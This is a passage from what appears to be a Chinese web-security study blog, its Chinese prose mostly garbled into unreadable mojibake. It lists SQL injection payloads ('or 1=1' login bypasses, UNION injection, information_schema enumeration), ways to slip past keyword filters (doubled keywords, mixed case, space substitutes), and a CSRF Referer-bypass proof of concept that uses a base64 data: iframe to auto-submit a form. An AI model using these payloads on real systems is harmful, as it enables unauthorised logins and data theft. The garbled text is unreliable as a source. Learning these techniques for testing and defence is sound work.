¼ï¼Œä»è€Œé¿å…æŠ¥é”™<br>æ•…<br>â€“%20   &lt;&#x3D;&#x3D;&gt;   â€“+</p></blockquote><blockquote><p>or 1&#x3D;1â€“+</p><p>â€˜or 1&#x3D;1â€“+</p><p>â€œor 1&#x3D;1â€“+</p><p>)or 1&#x3D;1â€“+</p><p>â€˜)or 1&#x3D;1â€“+</p><p>â€œ) or 1&#x3D;1â€“+</p><p>â€œ))or 1&#x3D;1â€“+</p></blockquote><h4 id="3-sqlä¸­é€»è¾‘è¿ç®—ã€ä¸‡èƒ½å¯†ç çš„åŸç†ã€‘"><a href="#3-sqlä¸­é€»è¾‘è¿ç®—ã€ä¸‡èƒ½å¯†ç çš„åŸç†ã€‘" class="headerlink" title="3.sqlä¸­é€»è¾‘è¿ç®—ã€ä¸‡èƒ½å¯†ç çš„åŸç†ã€‘"></a>3.sqlä¸­é€»è¾‘è¿ç®—ã€ä¸‡èƒ½å¯†ç çš„åŸç†ã€‘</h4><p>æå‡ºä¸€ä¸ªé—®é¢˜ <code>Select * from users where id=1 and 1=1</code>;è¿™æ¡è¯­å¥ä¸ºä»€ä¹ˆèƒ½å¤Ÿé€‰æ‹©å‡º id&#x3D;1 çš„å†…å®¹ï¼Œand 1&#x3D;1 åˆ°åº•èµ·ä½œç”¨äº†æ²¡æœ‰ï¼Ÿè¿™é‡Œå°±è¦æ¸…æ¥š sql è¯­å¥æ‰§è¡Œé¡ºåºäº†ã€‚ åŒæ—¶è¿™ä¸ªé—®é¢˜æˆ‘ä»¬åœ¨ä½¿ç”¨ä¸‡èƒ½å¯†ç çš„æ—¶å€™ä¼šç”¨åˆ°ã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç”¨ <code>â€™or 1=1#</code> ä½œä¸ºå¯†ç è¾“å…¥ã€‚åŸå› æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ </p><p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªé€»è¾‘è¿ç®—ï¼Œå½“ä½¿ç”¨ä¸Šè¿°æ‰€è°“çš„ä¸‡èƒ½å¯†ç åï¼Œæ„æˆçš„ sql è¯­å¥ä¸ºï¼š </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * <span class="keyword">from</span> admin where <span class="attribute">username</span>=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">&#x27;&#x27;</span>or <span class="attribute">1</span>=1#&#x27;</span><br></pre></td></tr></table></figure><p>Explain:ä¸Šé¢çš„è¿™ä¸ªè¯­å¥æ‰§è¡Œåï¼Œæˆ‘ä»¬åœ¨ä¸çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹å°±ç™»å½•åˆ°äº† admin ç”¨æˆ·äº†ã€‚åŸ å›  æ˜¯ åœ¨ where å­ å¥ å ï¼Œ æˆ‘ ä»¬ å¯ ä»¥ çœ‹ åˆ° ä¸‰ ä¸ª æ¡ ä»¶ è¯­ å¥ <code>username=&#39;admin&#39; and password=&#39;&#39;or 1=1</code>ã€‚ä¸‰ä¸ªæ¡ä»¶ç”¨ and å’Œ or è¿›è¡Œè¿æ¥ã€‚åœ¨ sql ä¸­ï¼Œæˆ‘ä»¬ <u><strong>and çš„è¿ç®—ä¼˜å…ˆçº§å¤§äº or çš„å…ƒç®—ä¼˜å…ˆçº§</strong></u>ã€‚å› æ­¤å¯ä»¥çœ‹åˆ° <u><strong>ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼ˆç”¨ a è¡¨ç¤ºï¼‰æ˜¯çœŸçš„ï¼Œç¬¬äºŒä¸ªæ¡ä»¶ï¼ˆç”¨ b è¡¨ç¤ºï¼‰æ˜¯å‡çš„ï¼Œa and b &#x3D; false</strong></u>,ç¬¬ä¸€ä¸ªæ¡ä»¶å’Œç¬¬äºŒä¸ªæ¡ä»¶æ‰§è¡Œ and åæ˜¯å‡ï¼Œå†ä¸<u><strong>ç¬¬ä¸‰ ä¸ªæ¡ä»¶ or è¿ç®—ï¼Œå› ä¸ºç¬¬ä¸‰ä¸ªæ¡ä»¶ 1&#x3D;1 æ˜¯æ’æˆç«‹çš„ï¼Œæ‰€ä»¥ç»“æœè‡ªç„¶å°±ä¸ºçœŸäº†</strong></u>ã€‚å› æ­¤ä¸Šè¿°çš„è¯­ å¥å°±æ˜¯æ’çœŸäº†</p><p>ps.<strong><code>é€»è¾‘è¯­å¥çš„åŒºåˆ«</code></strong></p><blockquote><p>1.and:ä¸¤ä¸ªæˆ–å¤šä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³ï¼Œæ‰ä¸ºçœŸï¼ˆæ˜¾ç¤ºä¸€æ¡æ•°æ®ï¼‰</p><p>2.or:ä¸¤ä¸ªæˆ–å¤šä¸ªæ¡ä»¶æ»¡è¶³å…¶ä¸­ä¸€ä¸ªå³ä¸ºçœŸï¼ˆæ˜¾ç¤ºä¸€æ¡æ•°æ®ï¼‰</p><blockquote><p>ä½¿ç”¨andè¯­å¥æ³¨æ„<code>select * from test where a = 1 and a = 2</code>è¿™æ ·æ“ä½œè‚¯å®šä¸è¡Œï¼Œ<u><strong>åé¢çš„ä¸€ä¸ªå€¼ä¼šæŠŠå‰é¢çš„å€¼ç»™è¦†ç›–æ‰</strong></u>ï¼Œæœ€åæ‰§è¡Œçš„æ˜¯<code>select * from test where a = 2</code></p><p>è€Œç”¨orè¯­å¥çš„è¯<code>select * from test where a = 1 or a = 2</code>,æ‰§è¡Œ<code>select * from test where a = 1</code>,è‹¥<code>a=1</code>ä¸ºå‡ï¼Œåˆ™æ‰§è¡Œ<code>select * from test where a = 2</code></p></blockquote></blockquote><blockquote><p>3.union:è”åˆæŸ¥è¯¢ï¼Œå°†<u><strong>å¤šä¸ªæŸ¥è¯¢ç»“æœåˆå¹¶ï¼ˆå¦‚æœæœ‰ä¸€ä¸ªç»“æœä¸ºç©ºï¼Œä¸å½±å“å…¶ä»–ç»“æœåˆå¹¶ï¼‰</strong></u>èµ·æ¥æ—¶ï¼Œ<u><strong>ç³»ç»Ÿä¼šè‡ªåŠ¨å»æ‰é‡å¤å…ƒç»„</strong></u></p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œæ³¨æ„ï¼Œå¦‚æœid&#x3D;1ï¼Œé‚£ä¹ˆç»“æœåˆå¹¶æ—¶ï¼Œå°±ä¼šè¦†ç›–åé¢çš„ç»“æœï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å‰é¢çš„è¯­å¥è¿”å›ä¸ºç©ºï¼Œé‚£ä¹ˆåé¢çš„æ•°æ®å°±ä¼šæ˜¾ç°å‡ºæ¥</p></blockquote><p>è¯·æ³¨æ„ï¼ŒUNION å†…éƒ¨çš„ SELECT è¯­å¥å¿…é¡»æ‹¥æœ‰ç›¸åŒæ•°é‡çš„åˆ—ã€‚åˆ—ä¹Ÿå¿…é¡»æ‹¥æœ‰ç›¸ä¼¼çš„æ•°æ®ç±»å‹ã€‚åŒæ—¶ï¼Œæ¯æ¡ SELECT è¯­å¥ä¸­çš„åˆ—çš„é¡ºåºå¿…é¡»ç›¸åŒã€‚ </p><h4 id="4-æ³¨å…¥çš„ä¸€èˆ¬æµç¨‹ã€æŒ‰é¡ºåºæŸ¥è¯¢æ³¨å…¥ã€‘"><a href="#4-æ³¨å…¥çš„ä¸€èˆ¬æµç¨‹ã€æŒ‰é¡ºåºæŸ¥è¯¢æ³¨å…¥ã€‘" class="headerlink" title="4.æ³¨å…¥çš„ä¸€èˆ¬æµç¨‹ã€æŒ‰é¡ºåºæŸ¥è¯¢æ³¨å…¥ã€‘"></a>4.æ³¨å…¥çš„ä¸€èˆ¬æµç¨‹ã€æŒ‰é¡ºåºæŸ¥è¯¢æ³¨å…¥ã€‘</h4><h5 id="ps-å…³é”®è®°å¿†å’Œä½¿ç”¨"><a href="#ps-å…³é”®è®°å¿†å’Œä½¿ç”¨" class="headerlink" title="ps.å…³é”®è®°å¿†å’Œä½¿ç”¨"></a>ps.å…³é”®è®°å¿†å’Œä½¿ç”¨</h5><blockquote><p>schema_name æ•°æ®åº“å</p><p><code>information_schema.schemata</code> å…¨éƒ¨æ•°æ®åº“</p><p><code>table_name</code> è¡¨å</p><p><code>information_schema.tables</code> å…¨éƒ¨è¡¨</p><p><code>table_schema=â€™xxxxxâ€™</code> â€˜xxxxâ€™ä¸ºç›®æ ‡è¡¨æ‰€åœ¨çš„æ•°æ®åº“å</p><p><code>column_name</code> åˆ—å</p><p><code>information_schema.columns</code> å…¨éƒ¨åˆ—å</p><p><code>table_name=â€™xxxxxâ€™</code> â€˜xxxxâ€™æƒ³è¦æŸ¥è¯¢æ•°æ®æ‰€åœ¨çš„è¡¨å</p></blockquote><h5 id="1-æ³¨å…¥è¯­å¥"><a href="#1-æ³¨å…¥è¯­å¥" class="headerlink" title="[1] æ³¨å…¥è¯­å¥"></a>[1] æ³¨å…¥è¯­å¥</h5><blockquote><p>1ï¼‰çŒœæ•°æ®åº“ ã€ä»¥ä¸‹è¯­å¥åŠŸèƒ½ï¼Œæ˜¾ç¤ºè¯¥æ•°æ®åº“å†…æ‰€æœ‰æ•°æ®åº“çš„åå­—ã€‘</p><p><code>select schema_name from information_schema.schemata</code> </p><p>2ï¼‰çŒœæŸåº“çš„æ•°æ®è¡¨ ã€ä»¥ä¸‹è¯­å¥åŠŸèƒ½ï¼Œæ˜¾ç¤ºè¯¥æ•°æ®åº“å†…æ‰€æœ‰æ•°æ®åº“çš„åå­—ã€‘</p><p><code>select table_name from information_schema.tables where table_schema=â€™xxxxxâ€™</code> </p><p>3ï¼‰çŒœæŸè¡¨çš„æ‰€æœ‰åˆ—ã€ä»¥ä¸‹è¯­å¥åŠŸèƒ½ï¼Œæ˜¾ç¤ºè¯¥æ•°æ®åº“å†…æ‰€æœ‰æ•°æ®åº“çš„åå­—ã€‘</p><p><code>Select column_name from information_schema.columns where table_name=â€™xxxxxâ€™</code> </p><p>4ï¼‰è·å–æŸåˆ—çš„å†…å®¹ ã€ä»¥ä¸‹è¯­å¥åŠŸèƒ½ï¼Œæ˜¾ç¤ºè¯¥åˆ—ã€‘</p><p><code>Select è¯¥åˆ—çš„ç›®æ ‡æ•°æ®åˆ†ç±»çš„åç§°  from   åˆ—å</code></p></blockquote><h5 id="2-æ³¨å…¥æµç¨‹å›¾"><a href="#2-æ³¨å…¥æµç¨‹å›¾" class="headerlink" title="[2] æ³¨å…¥æµç¨‹å›¾"></a>[2] æ³¨å…¥æµç¨‹å›¾</h5><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg-blog.csdnimg.cn%2F20201009142512180.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhZHlfa2lsbGVyOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70&refer=http%3A%2F%2Fimg-blog.csdnimg.cn&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1656476375&t=82f2380c052f036e8454035070bc6a42" alt="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg-blog.csdnimg.cn%2F20201009142512180.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhZHlfa2lsbGVyOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70&amp;refer=http%3A%2F%2Fimg-blog.csdnimg.cn&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=auto?sec=1656476375&amp;t=82f2380c052f036e8454035070bc6a42"></p><h4 id="5-mysqlé”™è¯¯åˆ†æè§£å†³"><a href="#5-mysqlé”™è¯¯åˆ†æè§£å†³" class="headerlink" title="5.mysqlé”™è¯¯åˆ†æè§£å†³"></a>5.mysqlé”™è¯¯åˆ†æè§£å†³</h4><h5 id="1ï¼‰å­æŸ¥è¯¢ç»“æœå¤šäºä¸€è¡Œ"><a href="#1ï¼‰å­æŸ¥è¯¢ç»“æœå¤šäºä¸€è¡Œ" class="headerlink" title="1ï¼‰å­æŸ¥è¯¢ç»“æœå¤šäºä¸€è¡Œ"></a>1ï¼‰å­æŸ¥è¯¢ç»“æœå¤šäºä¸€è¡Œ</h5><p><code>Subquery returns more than 1 row</code></p><p>ä»¥<code>select * from table1 where table1.colums=(select columns from table2)</code>è¿™ä¸ªsqlè¯­å¥ä¸ºä¾‹</p><blockquote><p>1.å¦‚æœæ˜¯å†™å…¥é‡å¤ï¼Œå»æ‰é‡å¤æ•°æ®ã€‚ç„¶åå†™å…¥çš„æ—¶å€™ï¼Œå¯ä»¥åŠ é€»è¾‘åˆ¤æ–­(php)æˆ–è€…å¤–é”®(mysql)ï¼Œé˜²æ­¢æ•°æ®é‡å¤å†™å…¥ã€‚ï¼ˆä½†åœ¨å®é™…å¼€å‘ä¸­å¯èƒ½éœ€è¦é‡å¤å†™å…¥ï¼Œæ‰€ä»¥éœ€è¦æ…é‡è€ƒè™‘ï¼‰</p><p>2.åœ¨å­æŸ¥è¯¢æ¡ä»¶è¯­å¥åŠ <code>limit 1</code>,æ‰¾åˆ°ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„å°±å¯ä»¥äº†<br><code>select * from table1 where table1.colums in (select columns from table2 limit 1)</code> </p><p>å¦‚æœéœ€è¦ç»§ç»­å‘åæŸ¥è¯¢ï¼Œå¯ä»¥ç”¨<code>limit 0,1</code>   <code>limit 1,1</code>   <code>limit 2,1</code>   â€¦..  <code>limit n,1</code></p><p>3.åœ¨å­æŸ¥è¯¢å‰åŠ anyå…³é”®å­—<br>&#96;select * from table1 where table1.colums&#x3D;any(select columns from table2)</p></blockquote><h5 id="ps-å­æŸ¥è¯¢è¯­å¥"><a href="#ps-å­æŸ¥è¯¢è¯­å¥" class="headerlink" title="ps. å­æŸ¥è¯¢è¯­å¥"></a>ps. å­æŸ¥è¯¢è¯­å¥</h5><p><strong>å­æŸ¥è¯¢</strong>æ˜¯æŒ‡åœ¨<strong>ä¸€ä¸ªselectè¯­å¥ä¸­åµŒå¥—å¦ä¸€ä¸ªslecetè¯­å¥</strong>ã€‚</p><p><strong>anyã€inã€someã€all</strong>åˆ†åˆ«æ˜¯å­æŸ¥è¯¢å…³é”®è¯ä¹‹ä¸€ã€‚</p><p><strong>any</strong>å¯ä»¥ä¸&#x3D;ã€&gt;ã€&gt;&#x3D;ã€&lt;ã€&lt;&#x3D;ã€&lt;&gt;ç»“åˆèµ·æ¥ä½¿ç”¨ï¼Œåˆ†åˆ«è¡¨ç¤ºç­‰äºã€å¤§äºã€å¤§äºç­‰äºã€å°äºã€å°äºç­‰äºã€ä¸ç­‰äºå…¶ä¸­çš„ä»»ä½•ä¸€ä¸ªæ•°æ®ã€‚</p><p>allå¯ä»¥ä¸&#x3D;ã€&gt;ã€&gt;&#x3D;ã€&lt;ã€&lt;&#x3D;ã€&lt;&gt;ç»“åˆæ˜¯æ¥ä½¿ç”¨ï¼Œåˆ†åˆ«è¡¨ç¤ºç­‰äºã€å¤§äºã€å¤§äºç­‰äºã€å°äºã€å°äºç­‰äºã€ä¸ç­‰äºå…¶ä¸­çš„å…¶ä¸­çš„æ‰€æœ‰æ•°æ®ã€‚</p><p>ä»–ä»¬è¿›è¡Œå­æŸ¥è¯¢çš„è¯­æ³•å¦‚ä¸‹ï¼š</p><blockquote><p><code>operand comparison_operator any(subquery);</code><br><code>operand in (subquery);</code><br><code>operand coparison_operator some(subquery);</code><br><code>operand coparison_operator all (subquery);</code></p></blockquote><p><strong>any,allå…³é”®è¯å¿…é¡»ä¸ä¸€ä¸ªæ¯”è¾ƒæ“ä½œç¬¦ä¸€èµ·ä½¿ç”¨</strong></p><p>anyå…³é”®è¯å¯ä»¥ç†è§£ä¸º<strong>å¯¹äºå­æŸ¥è¯¢è¿”å›çš„åˆ—ä¸­çš„<u>ä»»æ„</u>æ•°å€¼ï¼Œå¦‚æœæ¯”è¾ƒç»“æœä¸ºtureï¼Œåˆ™è¿”å›true</strong><br>ä¾‹å¦‚ï¼š</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> s1 <span class="keyword">from</span> t1 <span class="keyword">where</span> s1 &gt; <span class="keyword">any</span> (<span class="keyword">select</span> s1 <span class="keyword">from</span> t2)</span><br></pre></td></tr></table></figure><p>å‡è®¾è¡¨t1ä¸­æœ‰ä¸€è¡ŒåŒ…å«ï¼ˆ10ï¼‰ ï¼Œ t2åŒ…å«ï¼ˆ20,12,5ï¼‰ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºtrueï¼›å¦‚æœt2åŒ…å«ï¼ˆ20,10ï¼‰ï¼Œæˆ–è€…è¡¨t2ä½ç©ºè¡¨ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºfalseã€‚å¦‚æœt2åŒ…å«ï¼ˆnullï¼Œnullï¼‰ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºunkonwnã€‚</p><p>allå…³é”®è¯<strong>å¯¹äºå­æŸ¥è¯¢è¿”å›çš„åˆ—ä¸­çš„<u>æ‰€æœ‰å€¼</u>ï¼Œå¦‚æœæ¯”è¾ƒç»“æœä¸ºtrueï¼Œåˆ™è¿”å›true</strong><br>ä¾‹å¦‚ï¼š</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> s1 <span class="keyword">from</span> t1 <span class="keyword">where</span> s1&gt; <span class="keyword">all</span> (<span class="keyword">select</span> s1 <span class="keyword">from</span> s2)</span><br></pre></td></tr></table></figure><p>å‡è®¾è¡¨t1ä¸­æœ‰ä¸€è¡ŒåŒ…å«ï¼ˆ10ï¼‰ã€‚å¦‚æœè¡¨t2åŒ…å«ï¼ˆ-5,0ï¼Œ+5ï¼‰ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºtrueï¼Œå› ä¸º10æ¯”t2ä¸­çš„æŸ¥å‡ºçš„æ‰€æœ‰ä¸‰ä¸ªå€¼å¤§ã€‚å¦‚æœè¡¨t2åŒ…å«ï¼ˆ12,6ï¼Œnullï¼Œ-100ï¼‰ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºfalseï¼Œå› ä¸ºt2ä¸­æœ‰ä¸€ä¸ªå€¼12å¤§äº10ã€‚å¦‚æœè¡¨t2åŒ…å«ï¼ˆ0ï¼Œnullï¼Œ1ï¼‰ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºunknownã€‚å¦‚æœt2ä¸ºç©ºè¡¨ï¼Œåˆ™ç»“æœä¸ºtrueã€‚</p><p>not in æ˜¯ â€œ&lt;&gt;allâ€çš„åˆ«åï¼Œç”¨æ³•ç›¸åŒã€‚<br>è¯­å¥in ä¸â€œ&#x3D;anyâ€æ˜¯ç›¸åŒçš„ã€‚<br>ä¾‹å¦‚ï¼š</p><p><code>select s1 from t1 where s1 = any (select s1 from t2)</code><br><code>select s1 from t1 where s1 in (select s1 from t2)</code></p><p>è¯­å¥someæ˜¯anyçš„åˆ«åï¼Œç”¨æ³•ç›¸åŒã€‚<br>ä¾‹å¦‚ï¼š</p><p><code>select s1 from t1 where s1 &lt;&gt; any (select s1 from t2)</code><br><code>select s1 from t1 where s1 &lt;&gt; some (select s1 from t2)</code></p><h4 id="6-mysql-è¿æ¥å‡½æ•°ï¼Œ-åˆ†ç»„è¿æ¥å‡½æ•°"><a href="#6-mysql-è¿æ¥å‡½æ•°ï¼Œ-åˆ†ç»„è¿æ¥å‡½æ•°" class="headerlink" title="6.mysql è¿æ¥å‡½æ•°ï¼Œ åˆ†ç»„è¿æ¥å‡½æ•°"></a>6.mysql è¿æ¥å‡½æ•°ï¼Œ åˆ†ç»„è¿æ¥å‡½æ•°</h4><blockquote><h5 id="1-concat"><a href="#1-concat" class="headerlink" title="1.concat()"></a>1.concat()</h5><p>concat(str1,str2,â€¦)</p><p>è‹¥æœ‰ä¸€ä¸ªå‚æ•°ä¸ºNULLï¼Œè¿”å›NULL</p><h5 id="2-concat-ws"><a href="#2-concat-ws" class="headerlink" title="2.concat_ws()"></a>2.concat_ws()</h5><p>concat_ws(â€˜é—´éš”ç¬¦å·â€™,str1,str2,â€¦)</p><p><strong>é—´éš”ç¬¦å·å¯ä»¥æ˜¯ç©ºæ ¼ï¼Œä¸èƒ½ä¸å†™ï¼Œå¦åˆ™è¿”å›ä¸ºç©º</strong></p><p>æ˜¾ç¤ºä¸ºstr1é—´éš”ç¬¦å·str2é—´éš”ç¬¦å·str3â€¦</p><h5 id="3-group-concat"><a href="#3-group-concat" class="headerlink" title="3.group_concat"></a>3.group_concat</h5><p>group_concat([distinct] å­—æ®µå [ order by æ’åºå­—æ®µ asc&#x2F;desc ] [separator â€œåˆ†éš”ç¬¦â€])</p><p>å¤šè¡Œæ•°æ®åœ¨ä¸€è¡Œæ˜¾ç¤ºå‡½æ•°</p><p>æ ¹æ®group byæŒ‡å®šçš„åˆ—è¿›è¡Œæ’åºåˆ†ç»„ï¼Œå°†åŒä¸€ç»„æ˜¾ç¤ºå‡ºæ¥ï¼Œå¹¶ç”¨åˆ†éš”ç¬¦é—´éš”</p><h5 id="ps-ç»„åˆä½¿ç”¨"><a href="#ps-ç»„åˆä½¿ç”¨" class="headerlink" title="ps. ç»„åˆä½¿ç”¨"></a>ps. ç»„åˆä½¿ç”¨</h5><p>å¦‚æœæ˜¯å¤šå­—æ®µç»„åˆ æ˜¾ç¤ºåœ¨ä¸€è¡Œçš„egï¼š</p><p>group_concat(concat_ws(â€˜,â€™,concat(str1ï¼Œstr2) ) )ï¼›</p><p>ä¸€ä¸ªå­—æ®µçš„è¯egï¼š</p><p>group_concat(concat_ws(â€˜,â€™,str1ï¼Œstr2) )ï¼› </p></blockquote><h4 id="7-è¿‡æ»¤æ›¿æ¢"><a href="#7-è¿‡æ»¤æ›¿æ¢" class="headerlink" title="*7.è¿‡æ»¤æ›¿æ¢"></a>*7.è¿‡æ»¤æ›¿æ¢</h4><h5 id="1ï¼‰åŒå†™ç»•è¿‡"><a href="#1ï¼‰åŒå†™ç»•è¿‡" class="headerlink" title="1ï¼‰åŒå†™ç»•è¿‡"></a>1ï¼‰åŒå†™ç»•è¿‡</h5><blockquote><p>(ç”¨äºæŠŠé»‘åå•çš„å­—ç¬¦æ›¿æ¢æˆç©º)ï¼šse<u>select</u>lect,un<u>union</u>ionï¼Œoorrç­‰ç­‰ï¼ˆæ›¿æ¢ä¸ºç©ºåï¼Œå‰©ä½™è¯­å¥å°±æ˜¯æ ‡å‡†çš„sqlè¯­å¥ï¼Œä¸ä¼šå½±å“è¯­å¥çš„æ­£å¸¸æ‰§è¡Œï¼‰</p><p>ps.æ³¨æ„ï¼Œæœ‰çš„è¯­å¥å‘½ä»¤å¯èƒ½ä¼šå¸¦æœ‰é»‘åå•çš„å­—ç¬¦ï¼Œä¹Ÿéœ€è¦åŒå†™ï¼Œå¦‚<u>or</u>der,inf<u>or</u>mation.schema_schemataç­‰ï¼Œå½“ç½‘ç«™åœ¨æ£€æŸ¥æ—¶ï¼ŒåŒæ ·ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œæ‰€ä»¥éœ€è¦å†™æˆo<u>or</u>rder,info<u>or</u>rmation.schema_schemataç­‰ç­‰</p></blockquote><h5 id="2ï¼‰å¤§å°å†™æ··åˆ"><a href="#2ï¼‰å¤§å°å†™æ··åˆ" class="headerlink" title="2ï¼‰å¤§å°å†™æ··åˆ"></a>2ï¼‰å¤§å°å†™æ··åˆ</h5><blockquote><p>(ç”¨äºé»‘åå•ä¸­åªæœ‰å°å†™æˆ–å¤§å†™ï¼Œå¹¶æ²¡æœ‰å¯¹å¤§å°å†™è¿›è¡ŒåŒºåˆ†)</p><p>å¦‚sEleCt,unIoNç­‰ç­‰</p></blockquote><h5 id="3ï¼‰æ›¿æ¢"><a href="#3ï¼‰æ›¿æ¢" class="headerlink" title="*3ï¼‰æ›¿æ¢"></a>*3ï¼‰æ›¿æ¢</h5><blockquote><p>selectï¼š</p><p>unionï¼š</p><p>ç©ºæ ¼ï¼š%0aï¼ˆåˆ†éš”ç¬¦ï¼‰ï¼Œ() ã€å¦‚select(table_name)from(xxx)ã€‘ï¼Œ&lt; &gt;ï¼Œ %20(space), %09(tab), IFS$9ï¼ˆ$IFSæ˜¯<strong>Unix</strong>ç³»ç»Ÿçš„ä¸€ä¸ªé¢„è®¾å˜é‡è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œ$9åªæ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ï¼‰</p><p>&#x3D;ï¼šlike</p><p>andï¼š&amp;&amp;</p><p>orï¼š||</p></blockquote><h4 id="8-æ³¨é‡Šç¬¦"><a href="#8-æ³¨é‡Šç¬¦" class="headerlink" title="8. æ³¨é‡Šç¬¦"></a>8. æ³¨é‡Šç¬¦</h4><blockquote><p>#ã€ â€“+ã€ â€“%20ã€ %23</p></blockquote><h2 id="äºŒã€xss"><a href="#äºŒã€xss" class="headerlink" title="äºŒã€xss"></a>äºŒã€xss</h2><p>æŠŠ<code>xss-labs</code>åšä¸€ä¸‹å°±å·®ä¸å¤šäº†ï¼Œåé¢è¿›é˜¶å†…å®¹æŒ‰æ˜¯éœ€è¦å­¦ä¹ å§</p><h2 id="ä¸‰ã€csrf"><a href="#ä¸‰ã€csrf" class="headerlink" title="ä¸‰ã€csrf"></a>ä¸‰ã€csrf</h2><h3 id="1ï¼‰ç»•è¿‡token"><a href="#1ï¼‰ç»•è¿‡token" class="headerlink" title="1ï¼‰ç»•è¿‡token"></a>1ï¼‰ç»•è¿‡token</h3><p>æœ‰çš„æ—¶å€™å…¶å®ç½‘ç«™æ ¹æœ¬ä¸éªŒè¯<code>token</code>ï¼Œä½†æ˜¯åœ¨å…¶ä»–æ–¹é¢ä¸Šå®ƒä»ç„¶åœ¨å·¥ä½œï¼Œæ‰€ä»¥ä¸ºäº†ç»•è¿‡å®ƒå¯ä»¥è€ƒè™‘æŠ“åŒ…åˆ å»<code>token</code>ï¼Œä»è€Œæ­£å¸¸è®¿é—®</p><h3 id="2ï¼‰ç»•è¿‡referer"><a href="#2ï¼‰ç»•è¿‡referer" class="headerlink" title="2ï¼‰ç»•è¿‡referer"></a>2ï¼‰ç»•è¿‡referer</h3><h4 id="1-refereræ¡ä»¶ä¸ºç©ºæ¡ä»¶æ—¶"><a href="#1-refereræ¡ä»¶ä¸ºç©ºæ¡ä»¶æ—¶" class="headerlink" title="1.refereræ¡ä»¶ä¸ºç©ºæ¡ä»¶æ—¶"></a>1.refereræ¡ä»¶ä¸ºç©ºæ¡ä»¶æ—¶</h4><blockquote><p>è§£å†³æ–¹æ¡ˆ:</p><p>åˆ©ç”¨<code>ftp://,http://,https://,file://,javascript:,data:</code>è¿™ä¸ªæ—¶å€™æµè§ˆå™¨åœ°å€æ æ˜¯<code>file://</code>å¼€å¤´çš„ï¼Œ</p><p>å¦‚æœè¿™ä¸ªHTMLé¡µé¢å‘ä»»ä½•httpç«™ç‚¹æäº¤è¯·æ±‚çš„è¯ï¼Œè¿™äº›è¯·æ±‚çš„<code>Referer</code>éƒ½æ˜¯ç©ºçš„ã€‚</p><p>ä¾‹:<br><code>1.åˆ©ç”¨data:åè®®</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>base64</code>ç¼–ç  è§£ç å³å¯çœ‹åˆ°ä»£ç 